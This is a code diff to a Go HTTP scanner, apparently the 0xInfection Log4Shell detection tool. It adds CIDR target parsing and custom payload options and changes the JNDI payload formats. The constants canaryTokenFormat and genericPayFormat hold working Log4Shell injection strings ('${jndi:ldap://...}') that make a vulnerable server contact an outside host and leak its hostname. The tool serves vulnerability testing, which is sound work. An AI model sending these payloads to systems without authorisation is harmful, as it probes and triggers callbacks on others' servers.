@@ -3,6 +3,7 @@ package main
 import (
 	"crypto/tls"
 	"fmt"
+	"regexp"
 	"time"
 
 	"github.com/valyala/fasthttp"
@@ -13,10 +14,12 @@ var (
 	useJson, useXML                  bool
 	maxConcurrent, delay             int
 	hHeaders, hBody, customServer    string
-	email, webhook, dummyXML, xload  string
-	canaryToken, dummyJSON, urlFile  string
+	email, webhook, dummyXML         string
+	canaryToken, urlFile             string
 	commonPorts, hMethods, userAgent string
-	allTargets, allPorts, allMethods []string
+	customPayload, headFile          string
+	allTargets, allPorts             []string
+	allMethods, xload                []string
 
 	procCount  = 1
 	canaryResp = new(CanaryResp)
@@ -35,16 +38,15 @@ var (
 		},
 	}
 	defaultHTTPHeaders = []string{
-		"A-IM", "Accept", "Accept-Charset", "Accept-Datetime", "Accept-Encoding",
+		"A-IM", "Accept-Charset", "Accept-Datetime", "Accept-Encoding", "X-Api-Version",
 		"Accept-Language", "Access-Control-Request-Method", "Access-Control-Request-Headers",
-		"Authorization", "Cache-Control", "Content-Encoding", "Content-MD5", "Content-Type",
-		"Cookie", "Date", "Expect", "Forwarded", "From", "HTTP2-Settings", "If-Match",
-		"If-Modified-Since", "If-None-Match", "If-Range", "If-Unmodified-Since",
-		"Max-Forwards", "Origin", "Pragma", "Prefer", "Proxy-Authorization", "Range", "Referer",
-		"TE", "Trailer", "Transfer-Encoding", "User-Agent", "Upgrade", "Via", "Warning",
-		"Upgrade-Insecure-Requests", "X-Requested-With", "DNT", "X-Forwarded-For", "X-Correlation-ID",
-		"X-Forwarded-Host", "X-Forwarded-Proto", "Front-End-Https", "X-ATT-DeviceId",
-		"X-Wap-Profile", "Proxy-Connection", "X-UIDH", "X-Csrf-Token", "X-Request-ID", "X-Api-Version",
+		"Authorization", "Cache-Control", "Cookie", "Expect", "Forwarded", "From", "X-IP",
+		"HTTP2-Settings", "If-Match", "If-Modified-Since", "If-None-Match", "If-Range", "X-Request-Id",
+		"If-Unmodified-Since", "True-Client-IP", "Origin", "Pragma", "Prefer", "Proxy-Authorization",
+		"Range", "Referer", "Forwarded-Proto", "TE", "Trailer", "Transfer-Encoding", "User-Agent",
+		"Upgrade", "Via", "Warning", "Upgrade-Insecure-Requests", "X-Requested-With", "DNT",
+		"X-Forwarded-For", "X-Correlation-ID", "X-Forwarded-Host", "X-Forwarded-Proto", "Front-End-Https",
+		"X-ATT-DeviceId", "X-Wap-Profile", "Proxy-Connection", "X-UIDH", "X-Csrf-Token", "X-Request-ID",
 	}
 	lackofart = fmt.Sprintf(`
     +---------------------+
@@ -52,6 +54,7 @@ var (
     +---------------------+  %s
 
                 ~ 0xInfection`, version)
+	cidrRex = regexp.MustCompile(`(?m)^(?:\d{1,3}\.){3}\d{1,3}\/(?:\d|[1-2]\d|3[0-2])$`)
 )
 
 type (
@@ -76,5 +79,5 @@ const (
 	letterBytes       = "abcdefghijklmnopqrstuvwxyz0123456789"
 	maxWorkers        = 100
 	canaryTokenFormat = "${jndi:ldap://x${hostName}.L4J.%s.canarytokens.com/a}"
-	genericPayFormat  = "${jndi:dns://${hostname}.%s}"
+	genericPayFormat  = "${jndi:ldap://$DNSNAME$--${hostname}.%s/asas}"
 )
